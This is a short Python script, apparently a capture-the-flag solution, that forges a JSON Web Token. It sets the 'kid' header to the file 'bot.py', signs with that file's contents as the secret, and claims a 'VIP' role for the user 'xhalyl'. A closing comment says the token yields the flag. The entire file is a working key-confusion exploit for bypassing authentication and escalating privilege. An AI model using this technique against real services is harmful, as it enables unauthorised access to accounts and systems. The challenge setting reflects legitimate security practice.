import jwt

with open('bot.py','r') as file:
                secret_key = file.read().strip()
headers = {
                'kid': 'bot.py'
            }
token = jwt.encode({'username': 'xhalyl','role' : 'VIP'}, secret_key, algorithm='HS256',headers=headers)
print(token)

# !verify <token> (should give you the flag) 